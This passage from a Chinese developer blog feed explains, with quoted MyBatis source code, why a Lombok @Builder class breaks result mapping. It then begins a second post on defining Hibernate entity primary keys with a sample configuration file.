<p>而当把 <code>@Builder</code> 注解去掉之后使用 <code>@Datae</code> 注解修饰，再次执行查询，接口返回的结果就正常了。如下图所示：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {  
    <span class="hljs-keyword">private</span> Date updateTime;  
    <span class="hljs-keyword">private</span> String name;  
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4edd8e0a2c740c5bc4af9372db0f1bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=MQTHzwiE4sezH%2FNpwXoBk5cvaOE%3D" alt="image.png" loading="lazy"/></p>
<p>为啥使用了 <code>@Builder</code> 就会报错，去掉之后就正常了，接下来将从源码角度来分析一下。</p>
<h2 data-id="heading-2">问题原因</h2>
<p>在 MyBatis 中是通过 <code>ResultSetHandler</code> 来对查询结果进行处理的。首先它会通过反射的方式创建一个对象的实例，在使用 <code>@Builder</code> 注解和不使用注解的区别对于 <code>User</code> 类来说是 <code>@Builder</code> 注解会生成一个全参的构造函数，而不使用的情况下，则会有一个默认的无参构造函数。如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58391f3ca2854486943a934ab28ffa7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=N1q%2Fu3rFhYcoCxzJ9HokyVTGu70%3D" alt="image.png" loading="lazy"/></p>
<p>在 MyBatis 中的 <code>DefaultResultSetHandler</code> 的 <code>createResultObject()</code> 方法实现了通过反射来创建对象，当是全参构造函数时走的的是 <code>createByConstructorSignature()</code> 方法这个分支。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createResultObject</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, 
    String columnPrefix)</span>
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">final</span> Class&lt;?&gt; resultType = resultMap.getType();
    <span class="hljs-keyword">final</span> <span class="hljs-type">MetaClass</span> <span class="hljs-variable">metaType</span> <span class="hljs-operator">=</span> MetaClass.forClass(resultType, reflectorFactory);
    <span class="hljs-keyword">final</span> List&lt;ResultMapping&gt; constructorMappings = resultMap.getConstructorResultMappings();
    <span class="hljs-keyword">if</span> (hasTypeHandlerForResultObject(rsw, resultType)) {
        <span class="hljs-keyword">return</span> createPrimitiveResultObject(rsw, resultMap, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!constructorMappings.isEmpty()) {
        <span class="hljs-keyword">return</span> createParameterizedResultObject(rsw, resultType, constructorMappings, constructorArgTypes, constructorArgs, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resultType.isInterface() || metaType.hasDefaultConstructor()) { <span class="hljs-comment">// 如果有无参构造函数直接走这里就创建对象了</span>
        <span class="hljs-keyword">return</span> objectFactory.create(resultType);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shouldApplyAutomaticMappings(resultMap, <span class="hljs-literal">false</span>)) {
        <span class="hljs-keyword">return</span> createByConstructorSignature(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs);
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(<span class="hljs-string">"Do not know how to create an instance of "</span> + resultType);
}
</code></pre>
<p>在 <code>createByConstructorSignature()</code> 方法实现了通过构造函数的方式来反射创建对象。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createByConstructorSignature</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, String columnPrefix, Class&lt;?&gt; resultType,
    List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> applyConstructorAutomapping(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs,
        findConstructorForAutomapping(resultType, rsw).orElseThrow(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(
            <span class="hljs-string">"No constructor found in "</span> + resultType.getName() + <span class="hljs-string">" matching "</span> + rsw.getClassNames())));
}
</code></pre>
<p>在创建之前会通过 <code>findConstructorForAutomapping()</code> 方法来查找一个合适的构造函数，当类的构造函数只有一个时，会直接使用这个这个构造函数。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Optional&lt;Constructor&lt;?&gt;&gt; findConstructorForAutomapping(<span class="hljs-keyword">final</span> Class&lt;?&gt; resultType, ResultSetWrapper rsw) {
    Constructor&lt;?&gt;[] constructors = resultType.getDeclaredConstructors();
    <span class="hljs-comment">// 只有一个构造函数时，直接使用这个构造函数</span>
    <span class="hljs-keyword">if</span> (constructors.length == <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">return</span> Optional.of(constructors[<span class="hljs-number">0</span>]);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> Constructor&lt;?&gt; constructor : constructors) {
        <span class="hljs-keyword">if</span> (constructor.isAnnotationPresent(AutomapConstructor.class)) {
            <span class="hljs-keyword">return</span> Optional.of(constructor);
        }
    }
    <span class="hljs-keyword">if</span> (configuration.isArgNameBasedConstructorAutoMapping()) {
      <span class="hljs-comment">// Finding-best-match type implementation is possible,</span>
      <span class="hljs-comment">// but using @AutomapConstructor seems sufficient.</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(MessageFormat.format(
          <span class="hljs-string">"'argNameBasedConstructorAutoMapping' is enabled and the class ''{0}'' has multiple constructors, so @AutomapConstructor must be added to one of the constructors."</span>,
          resultType.getName()));
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> Arrays.stream(constructors).filter(x -&gt; findUsableConstructorByArgTypes(x, rsw.getJdbcTypes())).findAny();
    }
}
</code></pre>
<p>然后在 <code>applyConstructorAutomapping()</code> 方法中会调用 <code>applyColumnOrderBasedConstructorAutomapping()</code> 方法。从该方法的命名也可以看出，它是实现了根据下标，而不是参数名称来实现构造参数的映射。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">applyConstructorAutomapping</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, String columnPrefix, Class&lt;?&gt; resultType, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, Constructor&lt;?&gt; constructor)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">foundValues</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (configuration.isArgNameBasedConstructorAutoMapping()) {
      <span class="hljs-comment">// 这个是根据构造参数的名称映射</span>
        foundValues = applyArgNameBasedConstructorAutoMapping(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs,
          constructor, foundValues);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 这个是根据构造参数的顺序映射</span>
        foundValues = applyColumnOrderBasedConstructorAutomapping(rsw, constructorArgTypes, constructorArgs, constructor,
          foundValues);
    }
    <span class="hljs-keyword">return</span> foundValues ? objectFactory.create(resultType, constructorArgTypes, constructorArgs) : <span class="hljs-literal">null</span>;
  }
</code></pre>
<p>在 <code>applyColumnOrderBasedConstructorAutomapping()</code> 方法中会从下标取构造函数中的参数，同时根据下标取查询结果里面的列名，先调用 <code>rsw.getTypeHandler()</code> 找到对应的 <code>TypeHandler</code> ，然后调用 TypeHandler 的 <code>getResult()</code> 方法尝试将列对应的值转为对应的构造函数的参数类型。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">applyColumnOrderBasedConstructorAutomapping</span><span class="hljs-params">(ResultSetWrapper rsw, List&lt;Class&lt;?&gt;&gt; constructorArgTypes,
      List&lt;Object&gt; constructorArgs, Constructor&lt;?&gt; constructor, <span class="hljs-type">boolean</span> foundValues)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; constructor.getParameterTypes().length; i++) {
        Class&lt;?&gt; parameterType = constructor.getParameterTypes()[i];
        <span class="hljs-type">String</span> <span class="hljs-variable">columnName</span> <span class="hljs-operator">=</span> rsw.getColumnNames().get(i);
        <span class="hljs-comment">// 先找到对应的TypeHandler</span>
        TypeHandler&lt;?&gt; typeHandler = rsw.getTypeHandler(parameterType, columnName);
        <span class="hljs-comment">// 调用TypeHandler将列对应的值转为对应的构造参数类型</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> typeHandler.getResult(rsw.getResultSet(), columnName);
        constructorArgTypes.add(parameterType);
        constructorArgs.add(value);
        foundValues = value != <span class="hljs-literal">null</span> || foundValues;
    }
    <span class="hljs-keyword">return</span> foundValues;
}
</code></pre>
<p>在本案例中构造函数的第一个参数类型是 <code>Date</code> 类型，第一个列名是 <code>name</code>。首先根据列名是找不到对应的 TypeHandler 的，然后调用 <code>TypeHandlerRegistry</code> 的 <code>getTypeHandler()</code> 方法获取对应的 <code>TypeHandler</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> TypeHandler&lt;?&gt; getTypeHandler(Class&lt;?&gt; propertyType, String columnName) {
    TypeHandler&lt;?&gt; handler = <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 根据列名找不到对应的TypeHandler</span>
    Map&lt;Class&lt;?&gt;, TypeHandler&lt;?&gt;&gt; columnHandlers = typeHandlerMap.get(columnName);
    <span class="hljs-keyword">if</span> (columnHandlers == <span class="hljs-literal">null</span>) {
        columnHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        typeHandlerMap.put(columnName, columnHandlers);
    } <span class="hljs-keyword">else</span> {
        handler = columnHandlers.get(propertyType);
    }
    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
        <span class="hljs-type">JdbcType</span> <span class="hljs-variable">jdbcType</span> <span class="hljs-operator">=</span> getJdbcType(columnName);
        handler = typeHandlerRegistry.getTypeHandler(propertyType, jdbcType);
      
      <span class="hljs-comment">// 省略代码</span>
    }
    <span class="hljs-keyword">return</span> handler;
}
</code></pre>
<p>在这个方法里面会先尝试根据 <code>jdbcType</code> 作为 key 获取对应的 <code>TypeHandler</code>，但是获取不到，然后尝试根据 null 作为 key 获取对应的 TypeHandler，这个实际上是获取到的是  <code>DateTypeHandler</code> 这个对象的实例。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> &lt;T&gt; TypeHandler&lt;T&gt; <span class="hljs-title function_">getTypeHandler</span><span class="hljs-params">(Type type, JdbcType jdbcType)</span> {
    <span class="hljs-keyword">if</span> (ParamMap.class.equals(type)) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt; jdbcHandlerMap = getJdbcHandlerMap(type);
    TypeHandler&lt;?&gt; handler = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (jdbcHandlerMap != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 先根据jdbcType作为key获取对应的TypeHandler</span>
        handler = jdbcHandlerMap.get(jdbcType);
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 根据null作为key获取，这里会获取到DateTypeHandler</span>
            handler = jdbcHandlerMap.get(<span class="hljs-literal">null</span>);
        }
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// #591</span>
            handler = pickSoleHandler(jdbcHandlerMap);
        }
    }
    <span class="hljs-comment">// type drives generics here</span>
    <span class="hljs-keyword">return</span> (TypeHandler&lt;T&gt;) handler;
}
</code></pre>
<p>而 <code>DateTypeHandler</code> 则是在 <code>TypeHandlerRegistry</code> 的构造函数里面注册的，注册的时候恰好是 null 作为 key 的。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TypeHandlerRegistry</span><span class="hljs-params">(Configuration configuration)</span> {
    <span class="hljs-built_in">this</span>.unknownTypeHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownTypeHandler</span>(configuration);
    <span class="hljs-comment">// 省略其它代码</span>
    register(Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTypeHandler</span>());
    register(JdbcType.TIMESTAMP, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTypeHandler</span>());
}

<span class="hljs-keyword">private</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(Type javaType, TypeHandler&lt;? extends T&gt; typeHandler)</span> {
    <span class="hljs-type">MappedJdbcTypes</span> <span class="hljs-variable">mappedJdbcTypes</span> <span class="hljs-operator">=</span> typeHandler.getClass().getAnnotation(MappedJdbcTypes.class);
    <span class="hljs-keyword">if</span> (mappedJdbcTypes != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">for</span> (JdbcType handledJdbcType : mappedJdbcTypes.value()) {
            register(javaType, handledJdbcType, typeHandler);
        }
        <span class="hljs-keyword">if</span> (mappedJdbcTypes.includeNullJdbcType()) {
            register(javaType, <span class="hljs-literal">null</span>, typeHandler);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 这里注册了key为null的DateTypeHandler</span>
        register(javaType, <span class="hljs-literal">null</span>, typeHandler);
    }
}
</code></pre>
<p>在本案例中 <code>DateTypeHandler</code> 的 <code>getNullableResult()</code> 方法中传入的列名是 <code>name</code>，然后调用 <code>ResultSet</code> 的 <code>getTimestamp()</code> 方法获取 <code>Timestamp</code> 类型的实例，因为实际上这个列的值是 <code>Jone</code> ，当然是转不成 <code>Timestamp</code> 类型的，因此报错了。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span>
      <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-type">Timestamp</span> <span class="hljs-variable">sqlTimestamp</span> <span class="hljs-operator">=</span> rs.getTimestamp(columnName);
    <span class="hljs-keyword">if</span> (sqlTimestamp != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(sqlTimestamp.getTime());
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>当去掉 <code>@Builder</code> 注解时，使用的构造函数就是无参构造函数，直接通过无参构造函数就创建对象了，自然就不需要按照构造参数下标将列转为对应的构造参数类型了。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createResultObject</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, String columnPrefix)</span>
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">final</span> Class&lt;?&gt; resultType = resultMap.getType();
    <span class="hljs-keyword">final</span> <span class="hljs-type">MetaClass</span> <span class="hljs-variable">metaType</span> <span class="hljs-operator">=</span> MetaClass.forClass(resultType, reflectorFactory);
    <span class="hljs-keyword">final</span> List&lt;ResultMapping&gt; constructorMappings = resultMap.getConstructorResultMappings();
    <span class="hljs-keyword">if</span> (hasTypeHandlerForResultObject(rsw, resultType)) {
        <span class="hljs-keyword">return</span> createPrimitiveResultObject(rsw, resultMap, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!constructorMappings.isEmpty()) {
        <span class="hljs-keyword">return</span> createParameterizedResultObject(rsw, resultType, constructorMappings, constructorArgTypes, constructorArgs, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resultType.isInterface() || metaType.hasDefaultConstructor()) { <span class="hljs-comment">// 如果有无参构造函数直接走这里就创建对象了</span>
        <span class="hljs-keyword">return</span> objectFactory.create(resultType);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shouldApplyAutomaticMappings(resultMap, <span class="hljs-literal">false</span>)) {
        <span class="hljs-keyword">return</span> createByConstructorSignature(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs);
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(<span class="hljs-string">"Do not know how to create an instance of "</span> + resultType);
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（15）Hibernate中如何定义一个实体的主键？]]></title>    <link>https://juejin.cn/post/7589838714450591785</link>    <guid>https://juejin.cn/post/7589838714450591785</guid>    <pubDate>2025-12-31T23:06:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838714450591785" data-draft-id="7589839433320792127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（15）Hibernate中如何定义一个实体的主键？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-31T23:06:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（15）Hibernate中如何定义一个实体的主键？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T23:06:43.000Z" title="Wed Dec 31 2025 23:06:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，定义实体的主键是非常重要的步骤。主键用于唯一标识数据库表中的每一行记录。我们通常使用注解来定义实体的主键。</p>
<p>以下是一些常见的注解来定义实体的主键：</p>
<ol>
<li><code>@Id</code>：标记字段为实体的主键。</li>
<li><code>@GeneratedValue</code>：指定主键的生成策略。</li>
<li><code>@Column</code>：指定数据库表中列的详细信息。</li>
</ol>
<h3 data-id="heading-0">主键生成策略</h3>
<p><code>@GeneratedValue</code>注解有几种常用的生成策略：</p>
<ol>
<li><strong>AUTO</strong>：默认策略，JPA提供的主键生成方式，依据底层数据库的不同自动选择合适的生成策略。</li>
<li><strong>IDENTITY</strong>：采用数据库的自增长字段，如MySQL的AUTO_INCREMENT。</li>
<li><strong>SEQUENCE</strong>：使用数据库的序列，主要适用于Oracle数据库。</li>
<li><strong>TABLE</strong>：通过一张表来生成主键，该表通常用于模拟序列。</li>
</ol>
<h3 data-id="heading-1">示例代码</h3>
<p>下面是一个完整的示例，通过不同的生成策略来定义实体的主键。</p>
<h4 data-id="heading-2">配置文件 <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil 类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
